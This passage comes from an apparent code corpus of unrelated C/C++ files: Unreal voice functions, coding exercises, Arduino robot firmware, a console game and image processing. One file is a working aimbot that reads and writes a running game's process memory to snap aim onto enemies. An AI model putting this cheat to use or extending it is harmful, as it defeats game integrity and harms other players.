UAdvancedVoiceLibrary::UnRegisterAllLocalTalkers(UObject* WorldContextObject)\n{\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"UnRegister All Local Talkers couldn't get the voice interface!\"));\n\t\treturn;\n\t}\n\n\tVoiceInterface->UnregisterLocalTalkers();\n}\n\nbool UAdvancedVoiceLibrary::RegisterRemoteTalker(UObject* WorldContextObject, const FBPUniqueNetId& UniqueNetId)\n{\n\tif (!UniqueNetId.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Register Remote Talker was passed an invalid unique net id!\"));\n\t\treturn false;\n\t}\n\n\tUWorld* const World = GEngine->GetWorldFromContextObject(WorldContextObject, EGetWorldErrorMode::LogAndReturnNull);\n\tif (!IsValid(World))\n\t{\n\t\treturn false;\n\t}\n\n\tIOnlineVoicePtr VoiceInterface = Online::GetVoiceInterface(World);\n\n\tif (!VoiceInterface.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"Register Remote Talker couldn't get the voice interface!\"));\n\t\treturn false;\n\t}\n\n\treturn VoiceInterface->RegisterRemoteTalker(*UniqueNetId.GetUniqueNetId());\n}\n\nbool UAdvancedVoiceLibrary::UnRegisterRemoteTalker(UObject* WorldContextObject, const FBPUniqueNetId& UniqueNetId)\n{\n\tif (!UniqueNetId.IsValid())\n\t{\n\t\tUE_LOG(AdvancedVoiceLog, Warning, TEXT(\"UnRegister Remote Talker was passed an invalid unique net id!\"));\n\t\treturn false;\n\t}\n\n\tUWorld* const World = GEngine->GetWorldFromCon",
    "#include \"aimbot.hpp\"\n\n#include \"playerInfo.hpp\"\n#include \"../engine/engine.hpp\"\n#include \"../GUI/config.hpp\"\n\n#include \"../xutil.hpp\"\n#include \"../math.hpp\"\n#include \"../memory.hpp\"\n\nvoid aimbot(pid_t gamePid, Display* aimDisplay) {\n  for (;;) {\n    for (int i = 0; i < 32; ++i) {\n      \n      Player player = getPlayerByIndex(i);\n      Player p_local = getLocalPlayer();\n\n      if (!config->AIM) continue;\n\n      int aimbot_bone = 14;\n      switch (config->AIMhitbox) {\n      case 0: //head\n\taimbot_bone = 14;\n\tbreak;\n      case 1: //upper body\n\taimbot_bone = 12;\n\tbreak;\n      case 2: //lower body\n        aimbot_bone = 11;\n\tbreak;\n      }\n      \n      // if (getPidByWindow(aimDisplay, getFocusedWindow(aimDisplay)) != gamePid) continue;\n      \n      if (player.isDead == true || player.health <= 0) continue;\n      if (player.dormant == true) continue;\n      if (player.team == p_local.team) continue;\n      float screen_center[2] = {ENGINE::screenX/2.f, ENGINE::screenY/2.f};\n    \n      float enemy_screen[2];\n      WorldToScreen(gamePid, player.boneMatrix[aimbot_bone], enemy_screen);\n\n      // float screenIndex_screen[2];\n      // Player closestToScreen = getPlayerByIndex(AIMBOT::closestScreenIndex);\n      // WorldToScreen(gamePid, closestToScreen.absLocation, screenIndex_screen);\n\n      // if (distanceFormula2D(enemy_screen, screen_center) < distanceFormula2D(screenIndex_screen, screen_center))\n      // \tAIMBOT::closestScreenIndex = i;\n\n      if (distanceFormula3D(player.absLocation, p_local.absLocation) < distanceFormula3D(getPlayerByIndex(AIMBOT::closestDistanceIndex).absLocation, p_local.absLocation))\n       \tAIMBOT::closestDistanceIndex = i;\n\n      if (getPlayerByIndex(AIMBOT::aimIndex).isDead == true) AIMBOT::aimIndex = -1;\n      \n      float plocal_v[3];\n      Memory::Read(gamePid, ENGINE::pLocalPitch, &plocal_v[0], sizeof(float));\n      Memory::Read(gamePid, ENGINE::pLocalYaw, &plocal_v[1], sizeof(float));\n      plocal_v[2] = 0;\n      float plocal_vo[3] = {*plocal_v};\n      \n\tif (AIMBOT::aimIndex == i) {\n\n\t  float deltaLocation[3] = { float(p_local.absLocation[0] - player.boneMatrix[aimbot_bone][0]),\n\t\t\t\t     float(p_local.absLocation[1] - player.boneMatrix[aimbot_bone][1]),\n\t\t\t\t     float((p_local.absLocation[2] + p_local.height - 15 ) - player.boneMatrix[aimbot_bone][2]) };\n\n\t  float hyp = sqrt(deltaLocation[0] * deltaLocation[0] + deltaLocation[1] * deltaLocation[1]);\n\n\t  plocal_vo[0] = (float)(atan(deltaLocation[2] / hyp) * radpi);\n\t  plocal_vo[1] = (float)(atan(deltaLocation[1] / deltaLocation[0]) * radpi);\n\n\t  if (deltaLocation[0] >= 0.0f) {\n\t    plocal_vo[1] += 180.0f;\n\t  }\n\t  \n\t  if (config->AIMsmooth > 0) {\n\t    float deltaAngle[2] = {plocal_vo[0] - plocal_v[0], plocal_vo[1] - plocal_v[1]};\n\n\t    // https://github.com/joaovarelas/h00k-game-hack/blob/master/h00k/aimbot.cpp#L658\n\t    if (deltaAngle[0] >  180) deltaAngle[0] -= 360;\n\t    if (deltaAngle[1] >  180) deltaAngle[1] -= 360;\n\t    if (deltaAngle[0] < -180) deltaAngle[0] += 360;\n\t    if (deltaAngle[1] < -180) deltaAngle[1] += 360;\n\n\t    plocal_v[0] = deltaAngle[0]/config->AIMsmooth + plocal_v[0];\n\t    plocal_v[1] = deltaAngle[1]/config->AIMsmooth + plocal_v[1];\n\n\t    if(plocal_v[0] >  180) plocal_v[0] -= 360; \n\t    if(plocal_v[1] >  180) plocal_v[1] -= 360; \n\t    if(plocal_v[0] < -180) plocal_v[0] += 360; \n\t    if(plocal_v[1] < -180) plocal_v[1] += 360;\n\t  } else {\n\t    plocal_v[0] = plocal_vo[0];\n\t    plocal_v[1] = plocal_vo[1];\n\t  }\n\n\t  while (plocal_v[0] > 89)\n\t    plocal_v[0] -= 180;\n\n\t  while (plocal_v[0] < -89)\n\t    plocal_v[0] += 180;\n\n\t  if (isNaN(plocal_v[0]))\n\t    plocal_v[0] = 0;\n\n\t  while (plocal_v[1] > 180)\n\t    plocal_v[1] -= 360;\n\n\t  while (plocal_v[1] < -180)\n\t    plocal_v[1] += 360;\n\n\t  if (isNaN(plocal_v[1]))\n\t    plocal_v[1] = 0;\n\n\t  // https://github.com/GhostsOfHiroshima/Counter-Strike-Source-Hack/blob/master/Aimbot.cpp#L65\n\t  if (config->AIMrecoilcompensation) {\n\t    plocal_v[0] -= p_local.aimPunch[0] * 2.f;\n\t    plocal_v[1] -= p_local.aimPunch[1] * 2.f;\n\t  }\n\t}\n\n\tif (AIMBOT::aimIndex != -1 && isKeyDown(aimDisplay, XK_X)) {\n\t  if (config->AIMsmooth > 0) usleep(1000*1000/300);\n\t  Memory::Write(gamePid, ENGINE::pLocalPitch, &plocal_v[0], sizeof(float));\n\t  Memory::Write(gamePid, ENGINE::pLocalYaw, &plocal_v[1], sizeof(float));\n\t} else {\n\t  if (distanceFormula2D(screen_center, enemy_screen) <= 50)\n\t    AIMBOT::aimIndex = i;\n\t}\n    }\n  }\n}\n",
    "/*****************************************************************/ /**\n * @file   string.cpp\n * @brief  Contains the implementation of `maybe_in_const_segment`.\n * \n * @author RPC\n * @date   August 2024\n *********************************************************************/\n#include \"string.h\"\n\n#if defined(COLT_LINUX)\nextern char etext, edata, end; // The symbols must have some type to avoid warnings\n#elif defined(COLT_WINDOWS)\n  #include <Windows.h>\n  #include <Psapi.h>\n#endif\n\nbool clt::maybe_in_const_segment(const void* ptr) noexcept\n{\n  // Credits Morgan McGuire, Zander Majercik\n  // https://www.youtube.com/watch?v=fglXeSWGVDc\n#if defined(COLT_LINUX)\n  return (ptr < &edata) && (ptr > &etext);\n#elif defined(COLT_WINDOWS)\n  // Initialization will be performed once (Meyer's Singleton)\n  static MODULEINFO info;\n  static const bool BOOL = GetModuleInformation(\n      GetCurrentProcess(), GetModuleHandleA(nullptr), &info, sizeof(MODULEINFO));\n  // To avoid unused warning\n  (void)BOOL;\n  return uintptr_t(info.EntryPoint) < uintptr_t(ptr)\n         && uintptr_t(ptr)\n                < uintptr_t(info.EntryPoint) + uintptr_t(info.SizeOfImage);\n#else\n  static const char* PROBE        = \"___Colt_Internal_Str___\";\n  static const auto PROBE_ADDRESS = uintptr_t(PROBE);\n  return math::abs(i64(uintptr_t(ptr) - PROBE_ADDRESS)) < 5'242'880;\n#endif\n}",
    "#include <bits/stdc++.h>\nusing namespace std;\n\nint current_inc;\nint inc=INT_MIN;\nint main() {\n    int t;\n    cout << \"enter no of testcase\" << endl;\n    cin>>t;\n    while(t--) {\n\n        int n,k;\n        cout << \"enter vec size and max possi element of vec \" << endl;\n        cin>>n>>k;\n        int sum=0;\n        vector<int>arr(n);\n        for(int i=0; i<n; i++) { //taking arr input\n\n            cout << \"enter all n  array element\" << endl;\n            cin>>arr[i];\n        }\n\n        // your code goes here\n        for(int i=0; i+1<n; i++ ) {\n            sum+=abs(arr[i+1]-arr[i]);\n        }\n\n        for(int i=0; i+3<=n; i++) {\n\n            int a=arr[i+1]-arr[i];\n            int b=arr[i+2]-arr[i+1];\n            if(a*b<0) {\n                if((abs(k-arr[i])+\n                        abs(arr[i+2]-k))>\n                        abs(a)+abs(b)) {\n\n                    arr[i+1]=k;\n\n\n                }\n                if((abs(1-arr[i])+\n                        abs(arr[i+2]-1))>\n                        ( abs(arr[i+1]-arr[i])+\n                          abs(arr[i+2]-arr[i+1]))) {\n\n                    arr[i+1]=1;\n                }\n\n                current_inc=\n\n                    (abs(arr[i+1]-arr[i])+\n                     abs(arr[i+2]-arr[i+1]))-(abs(a)+abs(b));\n                inc=max(current_inc,abs(inc));\n\n            }\n        }\n        int  i=0;\n        int a=arr[i+1]-arr[i];\n        if(abs(k-arr[i+1])>\n                abs(a)) {\n\n            arr[i]=k;\n        }\n        if(abs(1-arr[i+1])>\n                abs(arr[i+1]-arr[i])) {\n\n\n            arr[i]=1;\n        }\n        current_inc=\n\n            (abs(arr[i+1]-arr[i])\n             -abs(a));\n        inc=max(current_inc,abs(inc));\n\n        i=n-2;\n        a=arr[i+1]-arr[i];\n\n        if(abs(k-arr[i+1])>\n                abs(a)) {\n\n            arr[i+1]=k;\n        }\n\n        if(abs(1-arr[i+1])>\n                abs(arr[i+1]-arr[i])) {\n\n            arr[i+1]=1;\n        }\n        current_inc=\n\n            (abs(arr[i+1]-arr[i])\n             -abs(a));\n        inc=max(current_inc,abs(inc));\n\n        cout << \"max possible sum after 1 element updation: \"<<\n             sum+inc << endl;\n\n    }\n\n}",
    "#include<bits/stdc++.h>\nusing namespace std;\n\nconst int size=20;\n    \n    \n    int noofelement1=0,noofelement2=0,noofelement3=0;\n    stack<int>st1;\n    stack<int>st2;\n    stack<int>st3;\n    \n   // stack<int>storage;\n    array<int,size>arr={-1};\n   \n   int top1=-1;\n   int end1=-1;\n   int top2=end1+1;\n   int end2=top2 +noofelement2;\n   int top3=end2+1;\n   int end3=top3 +noofelement3;\n    \n    void push_stack1(){\n    \n    top1++;\n    noofelement1++;\n    end1++;\n   // end1=top1+noofelement1-1;\n    \n   cout <<\"after end1++ end1 is :\" <<end1 << endl;\n    arr[end1]=st1.top();\n   cout << \"after st1.top() end1 is:\"<<end1 << endl;\n    st1.pop();\n    \n    }\n    void pop_stack1(){\n    \n    arr[end1]=-1;\n    //top1--;\n    noofelement1--;\n    end1--;\n    //cout << \"poped element is:\"<<st1.top()<< endl;\n    st1.pop();\n    \n    }\n    \n    void push_stack2(){\n    \n    top2=end1+1;\n    noofelement2++;\n    end2=top2+noofelement2-1;\n    cout <<\"after end2++ :\" <<end2 << endl;\n    arr[end2]=st2.top();\n    st2.pop();\n    \n    }\n    \n    void pop_stack2(){\n    \n    arr[end2]=-1;\n        end2--;\n    top2=end1+1;\n   noofelement2--;\n  //  end2--;\n    \n    \n    cout <<\"Is st2 empty? :\" <<st2.empty()<< endl;\n    //cout <<st2.top()<< endl;\n    st2.pop();\n    \n    }\n     \n    void push_stack3(){\n    \n    top3=end2+1;\n    noofelement3++;\n    end3=top3+noofelement3-1;\n    cout <<\"after end2++ :\" <<end3 << endl;\n    arr[end3]=st3.top();\n    st3.pop();\n    \n    }\n    \n    void pop_stack3(){\n    \n    arr[end3]=-1;\n        end3--;\n    top3=end2+1;\n   noofelement3--;\n  //  end2--;\n    \n    \n    cout <<\"Is st2 empty? :\" <<st3.empty()<< endl;\n    //cout <<st2.top()<< endl;\n    st3.pop();\n    \n    }\n    \n    \n    \nint main()\n{   clock_t start_time =clock();\n    cout << \"Hello World!\" << endl;\n    \n    st1.push(1);push_stack1();\n    st1.push(2);push_stack1();\n    st1.push(3);push_stack1();\n    st1.push(10);push_stack1();\n    st1.push(20);push_stack1();\n    st1.push(30);push_stack1();\n    st1.pop();pop_stack1();//st1.top()=5\n    st2.push(4);push_stack2();\n    st2.push(5);push_stack2();\n    st2.push(6);push_stack2();\n    //st2.top()=6;\n     st2.pop();pop_stack2();\n    st3.push(4);push_stack3();\n    st3.push(5);push_stack3();\n    st3.push(6);push_stack3();\n    \n    \n    \n    for(int i=0;i<size;i++){\n    cout << arr[i]<<\" \"<< endl;\n    }\n    \n    \n    clock_t end_time=clock();\n  double timespend=  (double) (end_time-start_time)/CLOCKS_PER_SEC*1e6;\n    cout << \"\\n\\nTime to run the code \"<<timespend <<\"microsecond\"<< endl;\n    \n    \n    return 0;\n}",
    "#include <AccelStepper.h>\r\n#include <NewPing.h>\r\n#include <Servo.h>\r\n////////////////////////////////////////////////////////////\r\n// Define step constants\r\n#define FULLSTEP 8\r\n#define HALFSTEP 4\r\n\r\n// Define end switch pins\r\n#define END_SWITCH1 38\r\n#define END_SWITCH2 39\r\n\r\nint ft_Speed = 700;\r\n\r\n// Creates two instances\r\n// Pins entered in sequence IN1-IN3-IN2-IN4 for proper step sequence\r\nAccelStepper stepper1(HALFSTEP, 34, 36, 35, 37);\r\nconst int relay_stepper = 40;\r\n\r\n// Variable to track the last debounce time\r\nunsigned long lastDebounceTime1 = 0;\r\nunsigned long lastDebounceTime2 = 0;\r\nunsigned long debounceDelay = 50;\r\n\r\n// Variables to store the switch states\r\nbool lastSwitchState1 = LOW;\r\nbool lastSwitchState2 = LOW;\r\nbool switchState1 = LOW;\r\nbool switchState2 = LOW;\r\n\r\n// Variable to track direction\r\nbool directionForward = true;\r\n// Variable to track whether motors should be moving\r\nbool motorsRunning = false;\r\n///////////////////////////////////////////////////////////\r\nServo myservo;  // create servo object to control a servo\r\nint posServo = 0;    // variable to store the servo position\r\n\r\n//Motor pump\r\nconst int WaterPumpPin = 28;\r\n//#include\"Ultrasonic.h\"\r\n#define MAX_DISTANCE 200 // Maximum distance (in cm) to ping.\r\n\r\n\r\nNewPing L_ultra(22, 23, MAX_DISTANCE); // Each sensor's trigger pin, echo pin, and max distance to ping.\r\nNewPing R_ultra (25, 24, MAX_DISTANCE);\r\nNewPing F_ultra(27, 26, MAX_DISTANCE);\r\n//ulstrasonic pinsPet\r\n/*distSensor L_ultra(22, 23);\r\ndistSensor R_ultra(25, 24);\r\ndistSensor F_ultra(27, 26);*/\r\n//read distances\r\nint distL, distF, distR;\r\nint obstacle = 20;//in cm\r\n\r\nbool Auto = false;\r\n\r\n// Step motor pins assignment\r\n#define FL_step 2\r\n#define FR_step 3\r\n#define BL_step 9\r\n#define BR_step 4\r\n\r\n#define FL_dir 5\r\n#define FR_dir 6\r\n#define BL_dir 10\r\n#define BR_dir 7\r\n\r\n// Define the stepper motors and the pins they will use\r\nAccelStepper MFL(AccelStepper::DRIVER, FL_step, FL_dir); // motor front left\r\nAccelStepper MFR(AccelStepper::DRIVER, FR_step, FR_dir); // motor front right\r\nAccelStepper MBL(AccelStepper::DRIVER, BL_step, BL_dir); // motor back left\r\nAccelStepper MBR(AccelStepper::DRIVER, BR_step, BR_dir); // motor back right\r\n\r\nconst int stepsPerRevolution = 3200; // 16x microstepping\r\nconst int Speed = 900;\r\n\r\n//water sensor pin\r\n#define waterSens_pin  A7\r\nfloat water_percent = 0;\r\n\r\n// Function prototype\r\nvoid Move(int v1, int v2, int v3, int v4);\r\nvoid Obstacle_avoid();\r\n\r\nunsigned long currentMillis ;\r\nunsigned long previousMillis = 0,  previousMillis1 = 0;\r\nconst long interval = 2000; // interval to wait (milliseconds)\r\nconst long stopInterval = 1000, stopInterval1 = 1000; // interval to stop between movements (milliseconds)\r\nint moveState = 0;\r\nbool isStopped = false;\r\n\r\nbool drop_food = false;\r\nbool pump_water = false;\r\nbool move_drawer = false;\r\nbool prev_move_drawer = true;\r\n\r\nconst int water_percent_tresh = 40;//treshlhod to stop or open water pump\r\n\r\nvoid setup() {\r\n  Serial.begin(57600);\r\n///////////Foot train component setup//////////////////\r\n  // Set the maximum speed, acceleration factor,\r\n  // initial speed for motor 1\r\n  stepper1.setMaxSpeed(1000.0);\r\n  stepper1.setAcceleration(50.0);\r\n  stepper1.setSpeed(0);\r\n\r\n  // Set pin modes for limit switches\r\n  pinMode(END_SWITCH1, INPUT);\r\n  pinMode(END_SWITCH2, INPUT);\r\n\r\n  pinMode(relay_stepper, OUTPUT);\r\n  digitalWrite(relay_stepper, HIGH);\r\n////////////////////////////////////////////////////\r\nmyservo.attach(29);  // attaches the servo on pin 29 to the servo object\r\nmyservo.write(0);\r\n\r\npinMode(WaterPumpPin, OUTPUT);\r\ndigitalWrite(WaterPumpPin, LOW);//Make water pump not running at beginning\r\n\r\n  MFL.setMaxSpeed(1000.0);\r\n  MFL.setAcceleration(500.0);\r\n\r\n  MFR.setMaxSpeed(1000.0);\r\n  MFR.setAcceleration(500.0);\r\n\r\n  MBL.setMaxSpeed(1000.0);\r\n  MBL.setAcceleration(500.0);\r\n\r\n  MBR.setMaxSpeed(1000.0);\r\n  MBR.setAcceleration(500.0);\r\n\r\n  moveState = 4;  // stop\r\n}\r\n\r\nvoid loop() {\r\ncurrentMillis = millis();\r\n\r\n//Read water percent\r\nwater_percent = (analogRead(waterSens_pin)* 100.0)/ 1023.0;\r\n//Serial.println(water_percent);\r\n//delay(50);\r\n\r\n  if (Serial.available() > 0) {\r\n    previousMillis1 = millis();\r\n    char command = Serial.read();  // Read the incoming command\r\n    // Execute the command\r\n    switch (command) {\r\n      case 'f':\r\n        moveState = 0;  // Move forward\r\n        if(Auto == true)Auto = false;\r\n        break;\r\n      case 'b':\r\n        moveState = 1;  // Move backward\r\n        if(Auto == true)Auto = false;\r\n        break;\r\n      case 'l':\r\n        moveState = 3;  // Turn left\r\n        if(Auto == true)Auto = false;\r\n        break;\r\n      case 'r':\r\n        moveState = 2;  // Turn right\r\n        if(Auto == true)Auto = false;\r\n        break;\r\n      case 'a':\r\n        if(Auto == false)Auto = true; // Auto mode\r\n        break;\r\n      case 'x':\r\n        if(drop_food == false && move_drawer != true){\r\n          myservo.write(60);\r\n          drop_food = true;\r\n          }\r\n        else{\r\n   ",
    "#include \"stdafx.h\"\n#include \"typedef.h\"\n#include \"GameObject.h\"\n#include \"Game.h\"\n#include \"StaticData.h\"\n#include \"game_typedef.h\"\n\nint\tg_iCursorPosX = 0;\nint g_iCursorPosY = 0;\n\nint g_iScreenWidth = 0;\nint g_iScreenHeight = 0;\n\nWCHAR* g_pBackBuffer = nullptr;\nWCHAR* g_pBackground = nullptr;\nWCHAR* g_pBackgroundLineBuffer = nullptr;\n\nBOOL g_bLeftKeyPressed = FALSE;\nBOOL g_bUpKeyPressed = FALSE;\nBOOL g_bRightKeyPressed = FALSE;\nBOOL g_bDownKeyPressed = FALSE;\nBOOL g_bSpaceKeyPressed = FALSE;\nDWORD g_dwCurScore = 0;\n\nHANDLE g_hOut = nullptr;\nDWORD\tg_dwCurFPS = 0;\nconst DWORD g_dwGameFPS = 60;\nconst DWORD g_dwTicksPerGameFame = 1000 / g_dwGameFPS;\nULONGLONG g_PrvGameFrameTick = 0;\n\nFLIGHT_OBJECT*\tg_pPlayer = nullptr;\n\n\nFLIGHT_OBJECT*\tg_ppAmmoList[MAX_AMMO_NUM] = {};\nDWORD g_dwCurAmmoNum = 0;\n\nFLIGHT_OBJECT*\tg_ppEnemyList[MAX_ENEMY_NUM] = {};\nDWORD g_dwCurEnemiesNum = 0;\n\n// control game status\nvoid OnGameFrame(ULONGLONG CurTick);\nvoid ProcessEnemies();\nvoid OnHitEnemy(FLIGHT_OBJECT* pEnemy, ULONGLONG CurTick);\nDWORD AddScore(DWORD dwAddval);\nvoid FillEnemies();\nvoid MoveEnemies();\nBOOL IsCollisionFlightObjectVsFlightObject(const FLIGHT_OBJECT* pObj0, const FLIGHT_OBJECT* pObj1);\nBOOL ProcessCollisionAmmoVsEnemies(FLIGHT_OBJECT* pAmmo, ULONGLONG CurTick);\nvoid ProcessCollision(ULONGLONG CurTick);\nvoid DeleteDestroyedEnemies(ULONGLONG CurTick);\nvoid ShootFromPlayer();\nvoid DeleteAllAmmos();\nvoid UpdateBackground();\n\n// display\nvoid ClearScreen();\nvoid DrawCursor();\nvoid Blt();\nvoid ClearBackBuffer();\nvoid UpdateFPS(DWORD dwFPS);\nvoid DrawFPS(int x, int y);\nvoid DrawScore(int x, int y);\nvoid DrawScene();\nvoid DrawFlightObject(FLIGHT_OBJECT* pFighter, int x, int y);\n\n// keyboard input\nvoid OnKeyDown_Left();\nvoid OnKeyUp_Left();\nvoid OnKeyDown_Up();\nvoid OnKeyUp_Up();\nvoid OnKeyDown_Right();\nvoid OnKeyUp_Right();\nvoid OnKeyDown_Down();\nvoid OnKeyUp_Down();\nvoid OnKeyDown_Space();\nvoid OnKeyUp_Space();\nBOOL ProcessInput(BOOL* pbOutExit);\n\nBOOL InitializeGame(HANDLE hOut)\n{\n\tsrand(GetTickCount());\n\n\tg_hOut = hOut;\n\tCONSOLE_SCREEN_BUFFER_INFO\tinfo = {};\n\tGetConsoleScreenBufferInfo(hOut, &info);\n\tg_iScreenWidth = (int)info.dwSize.X;\n\tg_iScreenHeight = info.srWindow.Bottom - info.srWindow.Top + 1;\n\n\n\tg_pBackBuffer = new WCHAR[g_iScreenWidth * g_iScreenHeight];\n\tfor (DWORD i = 0; i < (DWORD)(g_iScreenWidth * g_iScreenHeight); i++)\n\t{\n\t\tg_pBackBuffer[i] = L'.';\n\t}\n\tg_pBackground = new WCHAR[g_iScreenWidth * g_iScreenHeight];\n\tg_pBackgroundLineBuffer = new WCHAR[g_iScreenWidth];\n\tfor (DWORD i = 0; i < (DWORD)(g_iScreenWidth * g_iScreenHeight); i++)\n\t{\n\t\tg_pBackground[i] = L' ';\n\t}\n\t//DWORD\tdwStartNum = (g_iScreenWidth / 16) * (g_iScreenHeight / 8);\n\tDWORD\tdwStartNum = 36;\n\tfor (DWORD i = 0; i < dwStartNum; i++)\n\t{\n\t\tint x = rand() % (g_iScreenWidth / 8) * 8;\n\t\tint y = rand() % (g_iScreenHeight / 4) * 4;\n\n\n\t\tif (x >= g_iScreenWidth)\n\t\t\t__debugbreak();\n\n\t\tif (y >= g_iScreenHeight)\n\t\t\t__debugbreak();\n\n\t\tg_pBackground[x + y * g_iScreenWidth] = L'.';\n\t}\n\n\tCOORD\tpos = {};\n\tDWORD\tdwWrittenChrs = 0;\n\tFillConsoleOutputCharacter(hOut, L'.', (DWORD)(g_iScreenWidth * g_iScreenHeight), pos, &dwWrittenChrs);\n\n\tg_pPlayer = CreatePlayer();\n\n\n\treturn TRUE;\n}\nvoid GameLoop(BOOL* pbOutExit)\n{\n\tProcessInput(pbOutExit);\n\n\tULONGLONG CurTick = GetTickCount64();\n\tif ((DWORD)(CurTick - g_PrvGameFrameTick) > g_dwTicksPerGameFame)\n\t{\n\t\tOnGameFrame(CurTick);\n\t\tg_PrvGameFrameTick = CurTick;\n\t}\n\tDrawScene();\n}\n\n\nBOOL ProcessInput(BOOL* pbOutExit)\n{\n\tBOOL\tbUpdated = FALSE;\n\n\tif (GetAsyncKeyState(VK_LEFT))\n\t{\n\t\tif (!g_bLeftKeyPressed)\n\t\t{\n\t\t\tOnKeyDown_Left();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bLeftKeyPressed = TRUE;\n\t}\n\telse\n\t{\n\t\tif (g_bLeftKeyPressed)\n\t\t{\n\t\t\tOnKeyUp_Left();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bLeftKeyPressed = FALSE;\n\t}\n\tif (GetAsyncKeyState(VK_RIGHT))\n\t{\n\t\tif (!g_bRightKeyPressed)\n\t\t{\n\t\t\tOnKeyDown_Right();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bRightKeyPressed = TRUE;\n\t}\n\telse\n\t{\n\t\tif (g_bRightKeyPressed)\n\t\t{\n\t\t\tOnKeyUp_Right();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bRightKeyPressed = FALSE;\n\t}\n\n\tif (GetAsyncKeyState(VK_UP))\n\t{\n\t\tif (!g_bUpKeyPressed)\n\t\t{\n\t\t\tOnKeyDown_Up();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bUpKeyPressed = TRUE;\n\t}\n\telse\n\t{\n\t\tif (g_bUpKeyPressed)\n\t\t{\n\t\t\tOnKeyUp_Up();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bUpKeyPressed = FALSE;\n\t}\n\tif (GetAsyncKeyState(VK_DOWN))\n\t{\n\t\tif (!g_bDownKeyPressed)\n\t\t{\n\t\t\tOnKeyDown_Down();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bDownKeyPressed = TRUE;\n\t}\n\telse\n\t{\n\t\tif (g_bDownKeyPressed)\n\t\t{\n\t\t\tOnKeyUp_Down();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bDownKeyPressed = FALSE;\n\t}\n\tif (GetAsyncKeyState(VK_SPACE))\n\t{\n\t\tif (!g_bSpaceKeyPressed)\n\t\t{\n\t\t\tOnKeyDown_Space();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bSpaceKeyPressed = TRUE;\n\t}\n\telse\n\t{\n\t\tif (g_bSpaceKeyPressed)\n\t\t{\n\t\t\tOnKeyUp_Space();\n\t\t\tbUpdated = TRUE;\n\t\t}\n\t\tg_bSpaceKeyPressed = FALSE;\n\t}\n\tif (GetAsyncKeyState(VK_ESCAPE))\n\t{\n\t\t*pbOutExit = TRUE;\n\t\tbUpdated = TRUE;\n\t}\n\treturn bUpdated;\n}\nvoid DrawScene()\n{\n\tClearBackBuffer();\n\n\t// Draw player\n\tDrawFlightObject(g_pPlayer, g_pPlayer->x, g_pPlayer->y);\n\n\t// Draw Enemies\n\tfo",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <string.h>\n#include <omp.h>\n#include <jpeglib.h>\n#include <time.h>\n\n#define IMAGE_WIDTH 30000\n#define IMAGE_HEIGHT 22943\n#define RGB_CHANNELS 3\n\ntypedef struct {\n    uint8_t red;\n    uint8_t green;\n    uint8_t blue;\n} RGBPixel;\n\ntypedef struct {\n    uint8_t gray;\n} GrayPixel;\n\n// Declare static arrays for image data\nstatic RGBPixel img[IMAGE_HEIGHT][IMAGE_WIDTH];\nstatic GrayPixel grayscale[IMAGE_HEIGHT][IMAGE_WIDTH];\nstatic GrayPixel edges[IMAGE_HEIGHT][IMAGE_WIDTH];\n\nvoid grayscaleConversion() {\n    #pragma omp simd \n    for (int y = 0; y < IMAGE_HEIGHT; y++) {\n        for (int x = 0; x < IMAGE_WIDTH; x++) {\n            grayscale[y][x].gray = (uint8_t)((0.3 * img[y][x].red) +\n                                              (0.59 * img[y][x].green) +\n                                              (0.11 * img[y][x].blue));\n        }\n    }\n}\n\nvoid sobelEdgeDetection() {\n    int Gx[3][3] = {{-1, 0, 1}, {-2, 0, 2}, {-1, 0, 1}};\n    int Gy[3][3] = {{-1, -2, -1}, {0,  0,  0}, {1,  2,  1}};\n\n    #pragma omp simd \n    for (int y = 1; y < IMAGE_HEIGHT - 1; y++) {\n        for (int x = 1; x < IMAGE_WIDTH - 1; x++) {\n            int gradient_x = 0;\n            int gradient_y = 0;\n            \n            for (int dy = -1; dy <= 1; dy++) {\n                for (int dx = -1; dx <= 1; dx++) {\n                    gradient_x += Gx[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                    gradient_y += Gy[dy + 1][dx + 1] * grayscale[y + dy][x + dx].gray;\n                }\n            }\n\n            int gradient = abs(gradient_x) + abs(gradient_y);\n            edges[y][x].gray = (uint8_t)(gradient > 255 ? 255 : gradient);\n        }\n    }\n}\n\nvoid loadJPEGImage(const char *filename) {\n    struct jpeg_decompress_struct cinfo;\n    struct jpeg_error_mgr jerr;\n    FILE *infile;\n    JSAMPARRAY buffer;\n    int row_stride;\n\n    if ((infile = fopen(filename, \"rb\")) == NULL) {\n        fprintf(stderr, \"Error: Unable to open file %s for reading.\\n\", filename);\n        exit(EXIT_FAILURE);\n    }\n\n    cinfo.err = jpeg_std_error(&jerr);\n    jpeg_create_decompress(&cinfo);\n    jpeg_stdio_src(&cinfo, infile);\n    jpeg_read_header(&cinfo, TRUE);\n    jpeg_start_decompress(&cinfo);\n\n    if (cinfo.output_components != RGB_CHANNELS) {\n        fprintf(stderr, \"Error: JPEG must be in RGB format.\\n\");\n        exit(EXIT_FAILURE);\n    }\n\n    row_stride = cinfo.output_width * cinfo.output_components;\n    buffer = (*cinfo.mem->alloc_sarray)((j_common_ptr) &cinfo, JPOOL_IMAGE, row_stride, 1);\n\n    while (cinfo.output_scanline < cinfo.output_height) {\n        jpeg_read_scanlines(&cinfo, buffer, 1);\n        for (int x = 0; x < cinfo.output_width; x++) {\n            img[cinfo.output_scanline - 1][x].red = buffer[0][x * cinfo.output_components];\n            